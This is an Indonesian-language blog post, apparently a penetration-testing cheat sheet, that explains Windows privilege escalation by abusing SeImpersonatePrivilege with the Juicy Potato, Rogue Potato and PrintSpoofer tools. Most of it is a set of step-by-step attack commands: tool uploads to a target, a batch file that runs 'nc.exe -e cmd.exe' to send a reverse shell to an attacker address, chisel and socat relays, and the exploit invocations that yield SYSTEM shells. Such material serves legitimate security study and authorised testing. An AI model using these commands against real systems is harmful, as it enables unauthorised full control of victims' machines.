---
title: '[Privilege Abuse] SeImpersonatePrivilege or SeAssignPrimaryToken (Potatoes)'
date: 2022-05-29 09:00:22 +0700
categories: [Windows, Privilege Escalations]
tags: [windows, privilege escalation, potato]     # TAG names should always be lowercase
author:
  name: Nairpaa
  link: https://nairpaa.github.io
---

Hak akses `SeImpersonatePrivilege` (*Impersonate* klien setelah otentikasi) diperkenalkan di Windows 2000 SP4.

Klien dari hak akses ini adalah anggota grup *Device’s Local Administrators Group* dan *Device’s Local Service Account*. 

Selain pengguna dan grup tersebut, komponen berikut juga merupakan klien dari hak akses ini, yaitu: Layanan yang diinisiasi oleh server *Service Control Manager* **Component Object Model (COM)**.

Jika ada pengguna biasa memiliki hak akses `SeImpersontatePrivilege`, pengguna tersebut diizinkan untuk menjalankan program atas nama klien.

Hak akses khusus ini dirancang untuk mencegah server yang tidak sah meniru identitas klien yang terhubung melalui metode seperti **RPC** atau **Named Pipes**.

Dengan menyalahgunakan hak istimewa ini, kita dapat *impersonate* token apa pun yang ditanganinya. Kita bisa mendapatkan *privileged* token dari layanan Windows (DCOM) dan membuatnya melakukan otentikasi NTLM, lalu menjalankan proses sebagai SYSTEM.

`SeAssignPrimaryToken` sangat mirip dengan  `SeImpersonatePrivilege`, kita bisa mendapatkan *privileged* token menggunakan cara yang sama.

```powershell
PS > whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name             Description                                State
========================== ========================================= ========
SeImpersonatePrivilege     Impersonate a client after authentication Enabled
```

### TL/DR

- Jika sistem operasi >= Windows 10, Windows Server 2016, Server 2019, and Windows 10 - Coba [PrintSpoofer](#3-printspoofer)
- Jika sistem operasi >= Windows 10 1809 & Windows Server 2019 - Coba [Rogue Potato](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#roguePotato)
- Jika sistem operasi < Windows 10 1809 < Windows Server 2019 - Coba [Juicy Potato](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#juicyPotato)

## 1. Juicy Potato

1. Download binary [JuicyPotato.exe](https://github.com/ohpe/juicy-potato) dan upload ke target.
2. Upload juga `nc.exe` (atau bisa juga pakai `powershell`).
3. Buat `rev.bat` untuk di eksekusi.
```powershell
PS > echo "c:\users\public\nc.exe -e cmd.exe <ip-attacker> <port>" > rev.bat
```
4. Siapkan listener di mesin penyerang.
5. Exploit **Juicy Potato**.
```powershell
PS > .\JuicyPotato.exe -t * -p C:\Users\Public\rev.bat -l 9003
```
6. Kalau CLSID bermasalah, coba cari [CLSID lain](http://ohpe.it/juicy-potato/CLSID/).
```powershell
PS > .\JuicyPotato.exe -t * -p C:\Users\Public\rev.bat -l 9003 -c {CLSID}
```


## 2. Rogue Potato

1. Download binary [RoguePotato.exe](https://github.com/antonioCoco/RoguePotato) dan upload ke target.
2. Upload juga `chisel.exe` ke target.
3. *Reverse port forwarding*. 
    ```powershell
    # attacker
    ➜ ./chisel server -p <port> --reverse 

    # victim
    PS > .\chisel.exe <ip-attacker>:<port> R:9999:localhost:9999 
    ```
4. Jalanin `socat` pada mesin attacker
```bash
➜ sudo socat tcp-listen:135,reuseaddr,fork tcp:127.0.0.1:9999
```
5. Buat `rev.ps1` lalu upload ke target.
7. Siapkan listener di mesin penyerang.
8. Exploit **Rogue Potato**.
```powershell
PS > .\RoguePotato.exe -r <ip-attacker> -e "powershell C:\Users\Public\rev.ps1" -l 9999
```


## 3. PrintSpoofer

1. Download binary [PrintSpoofer.exe (1)](https://github.com/dievus/printspoofer) atau [PrintSpoofer.exe (2)](https://github.com/itm4n/PrintSpoofer) dan upload ke target.
2. Exploit **PrintSpoofer**.
```powershell
PS C:\Users\Ap> .\PrintSpoofer.exe -i -c cmd
```

---

## References

- https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
- https://www.youtube.com/watch?v=1ae64CdwLHE&t=2320s
- https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505
- https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/
- https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
- https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/